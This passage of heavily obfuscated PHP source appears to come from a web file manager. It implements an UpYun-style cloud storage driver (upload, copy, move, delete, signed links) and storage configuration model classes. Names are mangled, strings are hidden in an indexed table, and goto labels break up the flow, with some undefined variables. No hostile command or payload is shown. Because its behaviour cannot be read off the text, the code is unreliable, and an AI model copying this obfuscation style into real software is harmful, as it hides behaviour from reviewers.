$Ÿ²­«“•; } public function mkfile($†¯«ØñÎ, $¯ÎÏúáº = '', $²î¦ĞÔÈ = REPEAT_RENAME) { if ($this->setContent($†¯«ØñÎ, $¯ÎÏúáº)) { return $this->getPathOuter($†¯«ØñÎ); } return !1; } public function mkdir($´Â˜Şş¬, $Î–Üœù = REPEAT_SKIP) { $˜Á›ãö =& $_SERVER[ˆö¿ÚÌ¼]; $×¸º¹è± = trim($´Â˜Şş¬, $˜Á›ãö[8]); if ($this->_isFolder($×¸º¹è±)) { return $this->getPathOuter($×¸º¹è±); } $±³®Ü· = array($˜Á›ãö[1578]); $²ç¸áÍÃ = $this->ussRequest($×¸º¹è±, $˜Á›ãö[291], !1, $±³®Ü·); return $²ç¸áÍÃ[$˜Á›ãö[1311]] ? $this->getPathOuter($×¸º¹è±) : !1; } public function copyFile($Çì¬©Åã, $‹úˆ¯Åà) { $Šä†ç‹ =& $_SERVER[ˆö¿ÚÌ¼]; $¶ëÅ‡ç› = array($Šä†ç‹[1579] . "\57{$this->bucket}\x2f{$Çì¬©Åã}", $Šä†ç‹[1580]); $’”®õ¶º = $this->ussRequest($‹úˆ¯Åà, $Šä†ç‹[256], !1, $¶ëÅ‡ç›); return $’”®õ¶º[$Šä†ç‹[1311]] ? !0 : $this->getPathOuter($‹úˆ¯Åà); } public function moveFile($·¦¸¶’›, $¯È­ÄÀ) { $ìÁ¯Å‰® =& $_SERVER[ˆö¿ÚÌ¼]; $»ƒœ“«… = array($ìÁ¯Å‰®[1581] . "\57{$this->bucket}\57{$·¦¸¶’›}", $ìÁ¯Å‰®[1580]); $èšµ—½å = $this->ussRequest($¯È­ÄÀ, $ìÁ¯Å‰®[256], !1, $»ƒœ“«…); return $èšµ—½å[$ìÁ¯Å‰®[1311]] ? !0 : $this->getPathOuter($¯È­ÄÀ); } public function delFile($†üĞÆñ) { $ó²ËÂİÚ =& $_SERVER[ˆö¿ÚÌ¼]; $ˆÜÁÖÁ› = $this->ussRequest($†üĞÆñ, $ó²ËÂİÚ[1582]); return $ˆÜÁÖÁ›[$ó²ËÂİÚ[1311]] ? !0 : !1; } public function delFolder($Ü¾òÂ½ú) { $¹Àñµø =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->exist($Ü¾òÂ½ú)) { return !0; } $this->listItemCache = !1; $ª¡—Ü‡É = $¤Æ¡ƒùù = array(); $this->fileList($Ü¾òÂ½ú, $ª¡—Ü‡É, $¤Æ¡ƒùù, !0); $this->listItemCache = !0; foreach ($¤Æ¡ƒùù as $øº“ü±“) { $Ú—Í’î = $this->ussRequest($øº“ü±“[$¹Àñµø[32]], $¹Àñµø[1582]); if (!$Ú—Í’î[$¹Àñµø[1311]]) { return !1; } } usort($ª¡—Ü‡É, function ($‡ãªµş, $‹ÁÌ“¬ı) { $É¥›å€¬ =& $_SERVER[ˆö¿ÚÌ¼]; return substr_count($‹ÁÌ“¬ı, $É¥›å€¬[8]) - substr_count($‡ãªµş, $É¥›å€¬[8]); }); foreach ($ª¡—Ü‡É as $÷Ëë¬ùè) { $Ú—Í’î = $this->ussRequest($÷Ëë¬ùè, $¹Àñµø[1582]); if (!$Ú—Í’î[$¹Àñµø[1311]]) { return !1; } } $Ú—Í’î = $this->ussRequest($Ü¾òÂ½ú, $¹Àñµø[1582]); return $Ú—Í’î[$¹Àñµø[1311]]; } public function rename($ÌÃËıë, $¡³–•Åµ) { if ($this->isFile($ÌÃËıë)) { $¡³–•Åµ = get_path_father($ÌÃËıë) . $¡³–•Åµ; return $this->moveFile($ÌÃËıë, $¡³–•Åµ); } return $this->renameObject($ÌÃËıë, $¡³–•Åµ); } public function fileInfo($Ãª¡Ë·¤, $ª÷éß÷ƒ = false, $â†óÊè = array()) { $ÑÙ‘Éš =& $_SERVER[ˆö¿ÚÌ¼]; $†¨·Šøû = array($ÑÙ‘Éš[32] => $this->pathThis($Ãª¡Ë·¤), $ÑÙ‘Éš[87] => $this->getPathOuter($ÑÙ‘Éš[8] . $Ãª¡Ë·¤), $ÑÙ‘Éš[33] => $ÑÙ‘Éš[233], $ÑÙ‘Éš[79] => isset($â†óÊè[$ÑÙ‘Éš[79]]) ? $â†óÊè[$ÑÙ‘Éš[79]] : 0, $ÑÙ‘Éš[169] => $this->ext($Ãª¡Ë·¤)); if ($ª÷éß÷ƒ) { return $†¨·Šøû; } $†¨·Šøû[$ÑÙ‘Éš[234]] = $†¨·Šøû[$ÑÙ‘Éš[88]] = 0; $†¨·Šøû[$ÑÙ‘Éš[235]] = $†¨·Šøû[$ÑÙ‘Éš[236]] = !0; if (empty($â†óÊè)) { $â†óÊè = $this->objectMeta($Ãª¡Ë·¤); if (!$â†óÊè) { return $†¨·Šøû; } } $†¨·Šøû[$ÑÙ‘Éš[234]] = intval($â†óÊè[$ÑÙ‘Éš[1583]]); $†¨·Šøû[$ÑÙ‘Éš[88]] = intval($â†óÊè[$ÑÙ‘Éš[1584]]); $†¨·Šøû[$ÑÙ‘Éš[79]] = $â†óÊè[$ÑÙ‘Éš[79]]; return $†¨·Šøû; } public function folderInfo($î–‰¥ˆ², $ÌÖ—ö…÷ = false) { $‘â»êºÍ =& $_SERVER[ˆö¿ÚÌ¼]; $æ‡Ë¦¦‚ = array($‘â»êºÍ[32] => $this->pathThis($î–‰¥ˆ²), $‘â»êºÍ[87] => $this->getPathOuter($‘â»êºÍ[8] . $î–‰¥ˆ²), $‘â»êºÍ[33] => $‘â»êºÍ[78]); if ($ÌÖ—ö…÷) { return $æ‡Ë¦¦‚; } $æ‡Ë¦¦‚[$‘â»êºÍ[234]] = $æ‡Ë¦¦‚[$‘â»êºÍ[88]] = 0; $æ‡Ë¦¦‚[$‘â»êºÍ[235]] = $æ‡Ë¦¦‚[$‘â»êºÍ[236]] = !0; if (empty($†¨ï„‡Ü)) { $†¨ï„‡Ü = $this->objectMeta($î–‰¥ˆ²); if (!$†¨ï„‡Ü) { return $æ‡Ë¦¦‚; } } $æ‡Ë¦¦‚[$‘â»êºÍ[234]] = intval($†¨ï„‡Ü[$‘â»êºÍ[1583]]); $æ‡Ë¦¦‚[$‘â»êºÍ[88]] = intval($†¨ï„‡Ü[$‘â»êºÍ[1584]]); return $æ‡Ë¦¦‚; } private function listObjs($å†üÀ…ß, $”–ÄºÖ = 0, $¯Öï÷›Ú = 1000) { $éÂñ¥Ï¯ =& $_SERVER[ˆö¿ÚÌ¼]; $Ã‹²±… = array($éÂñ¥Ï¯[1585], $éÂñ¥Ï¯[1586] . $¯Öï÷›Ú); if ($”–ÄºÖ) { $Ã‹²±…[] = $éÂñ¥Ï¯[1587] . $”–ÄºÖ; } $ª­·ØœÌ = $this->ussRequest($å†üÀ…ß, $éÂñ¥Ï¯[1510], !1, $Ã‹²±…); return !$ª­·ØœÌ[$éÂñ¥Ï¯[1311]] ? !1 : $ª­·ØœÌ[$éÂñ¥Ï¯[1301]]; } private function fileList($²š›„³, &$¸Úñ¬Ä, &$‹ÚŸ˜ğ•, $ó£ÇĞÂù = false) { $¦¹Ûûú« =& $_SERVER[ˆö¿ÚÌ¼]; $á‰ùö = $¦¹Ûûú«[12]; $›ë¤›§¢ = 1000; $ÖÖò¶õÃ = rtrim($²š›„³, $¦¹Ûûú«[8]) . $¦¹Ûûú«[8]; while (!0) { check_abort(); $‚²‚¦Ü¡ = $this->listObjs($²š›„³, $á‰ùö, $›ë¤›§¢); if (!$‚²‚¦Ü¡) { return !1; } $á‰ùö = isset($‚²‚¦Ü¡[$¦¹Ûûú«[1588]]) ? $‚²‚¦Ü¡[$¦¹Ûûú«[1588]] : $¦¹Ûûú«[12]; $’ÒÇÚõó = isset($‚²‚¦Ü¡[$¦¹Ûûú«[1589]]) ? $‚²‚¦Ü¡[$¦¹Ûûú«[1589]] : array(); foreach ($’ÒÇÚõó as $ÛŞÅ¹‹) { $„€µŒØÎ = $ÛŞÅ¹‹[$¦¹Ûûú«[33]] == $¦¹Ûûú«[78] ? !0 : !1; $ÈÊõÒÕØ = ltrim($ÖÖò¶õÃ . $ÛŞÅ¹‹[$¦¹Ûûú«[32]], $¦¹Ûûú«[8]) . ($„€µŒØÎ ? $¦¹Ûûú«[8] : $¦¹Ûûú«[12]); $½ÂÛÉ = array($¦¹Ûûú«[32] => $ÈÊõÒÕØ, $¦¹Ûûú«[33] => $„€µŒØÎ ? $¦¹Ûûú«[78] : $¦¹Ûûú«[233], $¦¹Ûûú«[79] => $ÛŞÅ¹‹[$¦¹Ûûú«[415]], $¦¹Ûûú«[1584] => $ÛŞÅ¹‹[$¦¹Ûûú«[1590]]); $this->cacheMethodInfoSet($ÈÊõÒÕØ, $„€µŒØÎ, $½ÂÛÉ); if ($„€µŒØÎ) { $¸Úñ¬Ä[] = $ÈÊõÒÕØ; if ($ó£ÇĞÂù) { $this->fileList($ÈÊõÒÕØ, $¸Úñ¬Ä, $‹ÚŸ˜ğ•, $ó£ÇĞÂù); } continue; } $‹ÚŸ˜ğ•[] = $½ÂÛÉ; } if (count($’ÒÇÚõó) < $›ë¤›§¢) { break; } } $this->cacheMethodInfoSet($²š›„³, !0); } public function listPath($Ğ°§ŒĞê, $­²‹’Òƒ = false) { $¢¬õÛæœ =& $_SERVER[ˆö¿ÚÌ¼]; $¹¡»‡Ò¶ = $æè­şõ» = array(); $this->fileList($Ğ°§ŒĞê, $¹¡»‡Ò¶, $æè­şõ»); foreach ($¹¡»‡Ò¶ as $ÜÙáŞ©Ã => $œèİİé) { $¹¡»‡Ò¶[$ÜÙáŞ©Ã] = $this->folderInfo($œèİİé, $­²‹’Òƒ); } foreach ($æè­şõ» as $ÜÙáŞ©Ã => $œèİİé) { $æè­şõ»[$ÜÙáŞ©Ã] = $this->fileInfo($œèİİé[$¢¬õÛæœ[32]], $­²‹’Òƒ, $œèİİé); } return array($¢¬õÛæœ[85] => $¹¡»‡Ò¶, $¢¬õÛæœ[86] => $æè­şõ»); } public function has($×¨·Â‡¹, $óúæ²‚¿ = false, $ÀÂÇàøÛ = true) { $ƒÆ–¼Ø =& $_SERVER[ˆö¿ÚÌ¼]; $®×öÓ = $ƒÆ–¼Ø[12]; $áå–Ï“‰ = 500; $ÓÌşÊ  = 0; $íÊõ’×Ô = 0; $€î‰ªÄ = rtrim($×¨·Â‡¹, $ƒÆ–¼Ø[8]) . $ƒÆ–¼Ø[8]; while (!0) { check_abort(); $€‹÷Ê¬Å = $this->listObjs($×¨·Â‡¹, $®×öÓ, $áå–Ï“‰); if (!$€‹÷Ê¬Å) { return !1; } $®×öÓ = isset($€‹÷Ê¬Å[$ƒÆ–¼Ø[1588]]) ? $€‹÷Ê¬Å[$ƒÆ–¼Ø[1588]] : $ƒÆ–¼Ø[12]; $×‡ù«ú = isset($€‹÷Ê¬Å[$ƒÆ–¼Ø[1589]]) ? $€‹÷Ê¬Å[$ƒÆ–¼Ø[1589]] : array(); if (empty($×‡ù«ú)) { break; } $Í¤®œáÔ = array_filter($×‡ù«ú, function ($èú»öİ) { $ÏµĞâ®û =& $_SERVER[ˆö¿ÚÌ¼]; return $èú»öİ[$ÏµĞâ®û[33]] == $ÏµĞâ®û[78]; }); $èÜÂ° = count($×‡ù«ú); $Í¤®œáÔ = count($Í¤®œáÔ); $î›˜±Ô‚ = $èÜÂ° - $Í¤®œáÔ; if ($óúæ²‚¿) { $íÊõ’×Ô += $Í¤®œáÔ; $ÓÌşÊ  += $î›˜±Ô‚; if ($èÜÂ° < $áå–Ï“‰) { break; } continue; } if ($ÀÂÇàøÛ) { if ($î›˜±Ô‚) { return !0; } } else { if ($Í¤®œáÔ) { return !0; } } if ($èÜÂ° < $áå–Ï“‰) { break; } } if ($óúæ²‚¿) { return array($ƒÆ–¼Ø[242] => $ÓÌşÊ , $ƒÆ–¼Ø[243] => $íÊõ’×Ô); } return !1; } public function listAll($Â„éËæÂ) { $ŸŒ‡’•æ =& $_SERVER[ˆö¿ÚÌ¼]; $ëÕ†¬Úğ = $ıÑŒÓè» = array(); $this->fileList($Â„éËæÂ, $ëÕ†¬Úğ, $ıÑŒÓè», !0); $‚®ÄŒ•½ = array_to_keyvalue($ıÑŒÓè», $ŸŒ‡’•æ[32]); foreach ($ëÕ†¬Úğ as $˜€öˆ€×) { if (is_string($˜€öˆ€×)) { $‚®ÄŒ•½[$˜€öˆ€×] = array($ŸŒ‡’•æ[79] => 0); } } return $this->listAllFiles($Â„éËæÂ, $‚®ÄŒ•½); } public function canRead($ò–·÷ËÂ) { return $this->exist($ò–·÷ËÂ) ? !0 : !1; } public function canWrite($ˆı—…Ù) { return $this->exist($ˆı—…Ù) ? !0 : !1; } public function getContent($Áµ«ñà’) { return $this->fileSubstr($Áµ«ñà’, 0, -1); } public function setContent($•£Èİƒş, $ë¿Ñìæ = '') { $‰ú‘ù£È =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ë¿Ñìæ) { $úøÔÄ‰ı = $this->ussRequest($•£Èİƒş, $‰ú‘ù£È[291]); return $úøÔÄ‰ı[$‰ú‘ù£È[1311]]; } $şù±›Õ  = $this->tempFile($this->pathThis($•£Èİƒş)); file_put_contents($şù±›Õ , $ë¿Ñìæ); if ($this->upload($•£Èİƒş, $şù±›Õ )) { $this->tempFileRemve($şù±›Õ ); return !0; } return !1; } public function fileSubstr($²çÒ¯àŞ, $„°‘§ÍÇ, $Ì­Àâ™­) { $·Í³ˆæı =& $_SERVER[ˆö¿ÚÌ¼]; if (!($ë´ÑŠƒ› = $this->link($²çÒ¯àŞ))) { return !1; } $µíÓ× = !1; if ($Ì­Àâ™­ > 0) { $§”àÚ¡ = $„°‘§ÍÇ + $Ì­Àâ™­ - 1; $µíÓ× = array($·Í³ˆæı[1549] . $„°‘§ÍÇ . $·Í³ˆæı[465] . $§”àÚ¡); } $œ›©ËÒ = url_request($ë´ÑŠƒ›, $·Í³ˆæı[1510], !1, $µíÓ×); return $œ›©ËÒ[$·Í³ˆæı[835]] ? $œ›©ËÒ[$·Í³ˆæı[1301]] : !1; } public function upload($Ï¦÷¸ô, $ì¥êµ©ë, $Î«ò‡ÇÙ = false, $¥±¥¢× = REPEAT_REPLACE) { $í¶ğÙ¿ =& $_SERVER[ˆö¿ÚÌ¼]; $ùí¤ª½ = IO::size($ì¥êµ©ë); if ($ùí¤ª½ <= 1024 * 1024 * 200) { $ğû–šƒ = array($í¶ğÙ¿[1591] . $ì¥êµ©ë); $ğ–¥÷¦‚ = $this->ussRequest($Ï¦÷¸ô, $í¶ğÙ¿[256], $ğû–šƒ); return $ğ–¥÷¦‚[$í¶ğÙ¿[1311]] ? $this->getPathOuter($Ï¦÷¸ô) : !1; } $âÒœïïö = 1024 * 1024 * 10; $ƒµ»‰Úö = array($í¶ğÙ¿[1592], $í¶ğÙ¿[1593] . $ùí¤ª½, $í¶ğÙ¿[1594], $í¶ğÙ¿[1595] . $âÒœïïö); $ğ–¥÷¦‚ = $this->ussRequest($Ï¦÷¸ô, $í¶ğÙ¿[256], !1, $ƒµ»‰Úö); if (!$ğ–¥÷¦‚[$í¶ğÙ¿[1311]]) { return !1; } $õĞ¹¼öâ = $ğ–¥÷¦‚[$í¶ğÙ¿[1301]]; $³¥—¤°­ = 0; $òÊ˜‘ÄÌ = $õĞ¹¼öâ[$í¶ğÙ¿[1596]]; $æ¼†ŠÊ­ = fopen($ì¥êµ©ë, $í¶ğÙ¿[1473]); if (!$æ¼†ŠÊ­) { return !1; } do { $­­•Á­× = $õĞ¹¼öâ[$í¶ğÙ¿[1597]]; fseek_64($æ¼†ŠÊ­, $³¥—¤°­); $°Ú‘òÅ÷ = fread($æ¼†ŠÊ­, $­­•Á­×); $°Ç›şÎé = 0; do { $°Ç›şÎé++; $õĞ¹¼öâ = $this->uploadPart($Ï¦÷¸ô, $õĞ¹¼öâ, $°Ú‘òÅ÷); } while (!$õĞ¹¼öâ && $°Ç›şÎé < 3); if (!$õĞ¹¼öâ) { return !1; } $òÊ˜‘ÄÌ = $õĞ¹¼öâ[$í¶ğÙ¿[1596]]; $³¥—¤°­ += $­­•Á­×; } while ($òÊ˜‘ÄÌ != -1); fclose($æ¼†ŠÊ­); $ƒµ»‰Úö = array($í¶ğÙ¿[1598], $í¶ğÙ¿[1599] . $õĞ¹¼öâ[$í¶ğÙ¿[1600]], $í¶ğÙ¿[1594]); $ğ–¥÷¦‚ = $this->ussRequest($Ï¦÷¸ô, $í¶ğÙ¿[256], !1, $ƒµ»‰Úö); return $ğ–¥÷¦‚[$í¶ğÙ¿[1311]] ? $this->getPathOuter($ñ¯äó¬«) : !1; } private function uploadPart($ÕêŠç÷ï, $½œáŠ«€, &$“ÉÜçíá) { $Õ·’è¢ç =& $_SERVER[ˆö¿ÚÌ¼]; $·€Œø°î = array($Õ·’è¢ç[1601], $Õ·’è¢ç[1599] . $½œáŠ«€[$Õ·’è¢ç[1600]], $Õ·’è¢ç[1602] . $½œáŠ«€[$Õ·’è¢ç[1596]], $Õ·’è¢ç[146] . $½œáŠ«€[$Õ·’è¢ç[1597]]); $ø©ø¤«Š = $this->ussRequest($ÕêŠç÷ï, $Õ·’è¢ç[256], $“ÉÜçíá, $·€Œø°î); return !$ø©ø¤«Š[$Õ·’è¢ç[1311]] ? $ø©ø¤«Š[$Õ·’è¢ç[1311]] : $ø©ø¤«Š[$Õ·’è¢ç[1301]]; } public function uploadFormData($ìó«Ãí›, $ˆşÎÈú´ = 3600) { return $this->uploadPolicy($ìó«Ãí›, $ˆşÎÈú´); } public function uploadMultiData($’÷Îñ”, $ºãèáêú = 3600) { $Ü·ÎüÃ› =& $_SERVER[ˆö¿ÚÌ¼]; $´å½Ò‡ = (int) $GLOBALS[$Ü·ÎüÃ›[7]][$Ü·ÎüÃ›[79]]; return $this->uploadPolicy($’÷Îñ”, $ºãèáêú, $´å½Ò‡); } private function uploadPolicy($’¾ˆºÜ¼, $““ëòµ = 3600, $±¹ÉĞâ¾ = 0) { $îÚ¶ÉŞ =& $_SERVER[ˆö¿ÚÌ¼]; $ÀäÇËì¬ = $îÚ¶ÉŞ[8] . $this->bucket; $ŞúùÎº = gmdate($îÚ¶ÉŞ[1508]); $¹ßŠ´ = array($îÚ¶ÉŞ[1603] => $this->bucket, $îÚ¶ÉŞ[1604] => $’¾ˆºÜ¼, $îÚ¶ÉŞ[1605] => time() + $““ëòµ, $îÚ¶ÉŞ[1606] => $ŞúùÎº); if ($±¹ÉĞâ¾) { $¹ßŠ´[$îÚ¶ÉŞ[1493]] = $±¹ÉĞâ¾; } $äñ”öï½ = base64_encode(json_encode($¹ßŠ´)); $€´Ñ†Á = base64_encode(hash_hmac($îÚ¶ÉŞ[1560], "\x50\x4f\x53\x54\46{$ÀäÇËì¬}\46{$ŞúùÎº}\46{$äñ”öï½}", md5("{$this->userpass}"), !0)); $ö¨‰¢å = array($îÚ¶ÉŞ[280] => $äñ”öï½, $îÚ¶ÉŞ[1607] => "\125\x50\x59\x55\116\40{$this->username}\x3a{$€´Ñ†Á}", $îÚ¶ÉŞ[209] => $this->endpoint . $ÀäÇËì¬); return $ö¨‰¢å; } public function download($ÕªØØÙş, $Šü›¬çÔ) { $¨İ¯¥»Ø = IO::getPathInner(IO::mkfile($Šü›¬çÔ)); if (!($“Øˆ”³ = $this->link($ÕªØØÙş))) { return !1; } $·óÖ™ÈÉ = 0; $ˆò£‘ÕÃ = 1024 * 200; $ñĞŸìÀ¬ = fopen($¨İ¯¥»Ø, $_SERVER[ˆö¿ÚÌ¼][1555]); while (!0) { $£Šæ¯Š› = $this->fileSubstr($ÕªØØÙş, $·óÖ™ÈÉ, $ˆò£‘ÕÃ); if ($£Šæ¯Š› === !1) { return !1; } fwrite($ñĞŸìÀ¬, $£Šæ¯Š›); $·óÖ™ÈÉ += $ˆò£‘ÕÃ; if (strlen($£Šæ¯Š›) < $ˆò£‘ÕÃ) { break; } } fclose($ñĞŸìÀ¬); return $Šü›¬çÔ; } public function link($ĞÀÔŠÎ¾, $È…å…ší = array()) { $€¹ˆ†  =& $_SERVER[ˆö¿ÚÌ¼]; $ĞÀÔŠÎ¾ = trim($ĞÀÔŠÎ¾, $€¹ˆ† [8]); if (!empty($this->token)) { $›ÒÅÉ‚” = strtotime(date($€¹ˆ† [1608])); $Õ¯ë‹³ı = substr(md5($this->token . $€¹ˆ† [287] . $›ÒÅÉ‚” . $€¹ˆ† [1609] . $ĞÀÔŠÎ¾), 12, 8) . $›ÒÅÉ‚”; $È…å…ší[] = $€¹ˆ† [1610] . $Õ¯ë‹³ı; } $¤’‡ªŒ = !empty($È…å…ší) ? $€¹ˆ† [76] . implode($€¹ˆ† [287], $È…å…ší) : $€¹ˆ† [12]; return $this->getHost() . $€¹ˆ† [8] . $this->pathEncode($ĞÀÔŠÎ¾) . $¤’‡ªŒ; } public function fileOut($«š§, $ŒÚÕúªÕ = false, $õÙÖ¨ç¤ = false, $Û§Çˆ³š = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($«š§, $ŒÚÕúªÕ, $õÙÖ¨ç¤, $Û§Çˆ³š); } if (!$õÙÖ¨ç¤) { $õÙÖ¨ç¤ = $this->pathThis($«š§); } $¦àœ‚ô = $ŒÚÕúªÕ ? array($_SERVER[ˆö¿ÚÌ¼][1611] . rawurlencode($õÙÖ¨ç¤)) : array(); $˜Ü´ì« = $this->link($«š§, $¦àœ‚ô); $this->fileOutLink($˜Ü´ì«); } public function fileOutServer($óß·ì˜•, $É¬Ã÷ = false, $º¥™öè = false, $¨µÚ°‡ë = '') { parent::fileOut($óß·ì˜•, $É¬Ã÷, $º¥™öè, $¨µÚ°‡ë); } public function fileOutImage($¡Ñ­æËø, $íœİ÷Ó» = 250) { $Ğâ¼Ã³Ú = $this->link($¡Ñ­æËø . $_SERVER[ˆö¿ÚÌ¼][1612] . $íœİ÷Ó»); $this->fileOutLink($Ğâ¼Ã³Ú); } public function fileOutImageServer($ÁÎËÖ¶¤, $êÁöÂ® = 250) { parent::fileOutImage($ÁÎËÖ¶¤, $êÁöÂ®); } public function hashMd5($ï°·Ûš) { $¶Õİ’ËÎ =& $_SERVER[ˆö¿ÚÌ¼]; $á…Á§¢Š = $this->_objectMeta($ï°·Ûš); return isset($á…Á§¢Š[$¶Õİ’ËÎ[248]]) ? $á…Á§¢Š[$¶Õİ’ËÎ[248]] : !1; } public function size($Ã´Îşöæ) { $«ã¿‘Ó· = $this->objectMeta($Ã´Îşöæ); return $«ã¿‘Ó· ? $«ã¿‘Ó·[$_SERVER[ˆö¿ÚÌ¼][79]] : 0; } public function info($€øÀ–ÀÎ) { if ($this->isFolder($€øÀ–ÀÎ)) { return $this->folderInfo($€øÀ–ÀÎ); } else { if ($this->isFile($€øÀ–ÀÎ)) { return $this->fileInfo($€øÀ–ÀÎ); } } return !1; } public function exist($Ø¾ª‚) { return $this->isFile($Ø¾ª‚) || $this->isFolder($Ø¾ª‚); } public function isFile($Ö’åæ‘) { return !$this->isFolder($Ö’åæ‘) && $this->objectMeta($Ö’åæ‘); } public function isFolder($ãŠíî§ø) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][180], $ãŠíî§ø); } protected function objectMeta($Ô×½˜ï¹) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][182], $Ô×½˜ï¹); } protected function _objectMeta($øØ¬âç¡) { $ı°”õŸ™ =& $_SERVER[ˆö¿ÚÌ¼]; if ($øØ¬âç¡ == $ı°”õŸ™[12] || $øØ¬âç¡ == $ı°”õŸ™[8]) { return array(); } $Æêí‚´ = $this->ussRequest($øØ¬âç¡, $ı°”õŸ™[1613]); if (!$Æêí‚´[$ı°”õŸ™[1311]]) { return null; } $¤Òñ’¸Î = isset($Æêí‚´[$ı°”õŸ™[1301]]) ? $Æêí‚´[$ı°”õŸ™[1301]] : array(); if (!isset($¤Òñ’¸Î[$ı°”õŸ™[1614]])) { return null; } $ª¶„Úøä = array($ı°”õŸ™[33] => isset($¤Òñ’¸Î[$ı°”õŸ™[1614]]) ? $¤Òñ’¸Î[$ı°”õŸ™[1614]] : null, $ı°”õŸ™[79] => isset($¤Òñ’¸Î[$ı°”õŸ™[1615]]) ? $¤Òñ’¸Î[$ı°”õŸ™[1615]] : null, $ı°”õŸ™[248] => isset($¤Òñ’¸Î[$ı°”õŸ™[1616]]) ? $¤Òñ’¸Î[$ı°”õŸ™[1616]] : null, $ı°”õŸ™[1583] => isset($¤Òñ’¸Î[$ı°”õŸ™[1617]]) ? $¤Òñ’¸Î[$ı°”õŸ™[1617]] : null); $ª¶„Úøä[$ı°”õŸ™[1584]] = isset($¤Òñ’¸Î[$ı°”õŸ™[1618]]) ? strtotime($¤Òñ’¸Î[$ı°”õŸ™[1618]]) : $ª¶„Úøä[$ı°”õŸ™[1583]]; return $ª¶„Úøä; } protected function _isFolder($û×ÅÔä) { $°ıûà‰ =& $_SERVER[ˆö¿ÚÌ¼]; if ($û×ÅÔä == $°ıûà‰[12] || $û×ÅÔä == $°ıûà‰[8]) { return !0; } $²¶Ş²ª = $this->_objectMeta($û×ÅÔä); return isset($²¶Ş²ª[$°ıûà‰[33]]) && $²¶Ş²ª[$°ıûà‰[33]] == $°ıûà‰[78] ? !0 : !1; } } goto bÛ‰ÙÍÊ›Ÿ; D¿Ó¶˜Æ©©: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\163\x6f\x75\162\143\145\123\x65\x63\x72\x65\x74\114\151\163\x74"; public $field = array("\163\157\165\x72\143\x65\111\104", "\x74\x79\160\145\111\x44", "\x63\162\x65\x61\x74\x65\125\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\163\164\x6f\162\x61\147\x65\114\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\163\151\x7a\x65\115\x61\170", "\x73\171\x73\164\145\155", "\144\145\146\x61\x75\x6c\164", "\x64\162\x69\166\x65\x72", "\x63\x6f\156\146\151\x67"); public function listData($ËóÂ·ô€ = false, $íõÃò‹ã = "\155\157\x64\151\146\x79\124\151\x6d\145", $”ÅËŠ¦¥ = false) { $Ëñ¾ù€€ =& $_SERVER[ˆö¿ÚÌ¼]; $¸ë ÈĞ = parent::listData($ËóÂ·ô€, $íõÃò‹ã, $”ÅËŠ¦¥); if ($ËóÂ·ô€) { return $¸ë ÈĞ; } $Ú÷ŞŠÅî = array(); if ($GLOBALS[$Ëñ¾ù€€[2323]]) { $Ú÷ŞŠÅî = $this->ioSizeUseGet(array_to_keyvalue($¸ë ÈĞ, $Ëñ¾ù€€[12], $Ëñ¾ù€€[478])); } foreach ($¸ë ÈĞ as $¢£¶è• => $Şï³Ã ) { unset($¸ë ÈĞ[$¢£¶è•][$Ëñ¾ù€€[6]]); $¸ë ÈĞ[$¢£¶è•][$Ëñ¾ù€€[1974]] = isset($Ú÷ŞŠÅî[$Şï³Ã [$Ëñ¾ù€€[478]]]) ? $Ú÷ŞŠÅî[$Şï³Ã [$Ëñ¾ù€€[478]]] : 0; } return $¸ë ÈĞ; } public function ioSizeUseGet($Á¿İ) { $¾Â‘™É¯ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Á¿İ) { return array(); } $ÁÔ¶í˜ = $¾Â‘™É¯[2324] . implode($¾Â‘™É¯[50], $Á¿İ); $£ÃŒÙ¿ª = Cache::get($ÁÔ¶í˜); if ($£ÃŒÙ¿ª) { return $£ÃŒÙ¿ª; } $½©ŠŞßë = array($¾Â‘™É¯[908] => $¾Â‘™É¯[478], $¾Â‘™É¯[2325] => $¾Â‘™É¯[79]); $·¢Ë˜ï = array($¾Â‘™É¯[908] => array($¾Â‘™É¯[7], $Á¿İ)); $£ÃŒÙ¿ª = Model($¾Â‘™É¯[876])->field($½©ŠŞßë)->where($·¢Ë˜ï)->group($¾Â‘™É¯[908])->select(); $£ÃŒÙ¿ª = array_to_keyvalue($£ÃŒÙ¿ª, $¾Â‘™É¯[478], $¾Â‘™É¯[79]); Cache::set($ÁÔ¶í˜, $£ÃŒÙ¿ª, 600); return $£ÃŒÙ¿ª; } public function getConfig($†»À¢ƒ´) { $»´Šœ´ç = parent::listData($†»À¢ƒ´); $¨€è‰Úü = _get($»´Šœ´ç, $_SERVER[ˆö¿ÚÌ¼][6], array()); if ($¨€è‰Úü && !is_array($¨€è‰Úü)) { $¨€è‰Úü = json_decode($¨€è‰Úü, !0); } return $¨€è‰Úü; } public function update($ŸæÂÈŒÑ, $Ãù¬Ó®À) { $¶ƒ€ ¶ =& $_SERVER[ˆö¿ÚÌ¼]; $Èï¹£îÎ = $Ãù¬Ó®À[$¶ƒ€ ¶[32]]; $ñ±Æ– á = array_to_keyvalue(parent::listData(), $¶ƒ€ ¶[32]); if (isset($ñ±Æ– á[$Èï¹£îÎ]) && $ñ±Æ– á[$Èï¹£îÎ][$¶ƒ€ ¶[478]] != $ŸæÂÈŒÑ) { return !1; } $this->checkPwd($ŸæÂÈŒÑ, $Ãù¬Ó®À); if (isset($Ãù¬Ó®À[$¶ƒ€ ¶[2326]]) && $Ãù¬Ó®À[$¶ƒ€ ¶[2326]] == $¶ƒ€ ¶[91]) { $this->checkConfig($Ãù¬Ó®À); } unset($Ãù¬Ó®À[$¶ƒ€ ¶[2326]]); $´À ”òï = parent::update($ŸæÂÈŒÑ, $Ãù¬Ó®À); if ($´À ”òï && $Ãù¬Ó®À[$¶ƒ€ ¶[37]]) { $Ò––¤Œ¸ = 0; foreach ($ñ±Æ– á as $ü‘ë²ˆû) { if ($ü‘ë²ˆû[$¶ƒ€ ¶[37]] && $ü‘ë²ˆû[$¶ƒ€ ¶[478]] != $ŸæÂÈŒÑ) { $Ò––¤Œ¸ = $ü‘ë²ˆû[$¶ƒ€ ¶[478]]; parent::update($ü‘ë²ˆû[$¶ƒ€ ¶[478]], array($¶ƒ€ 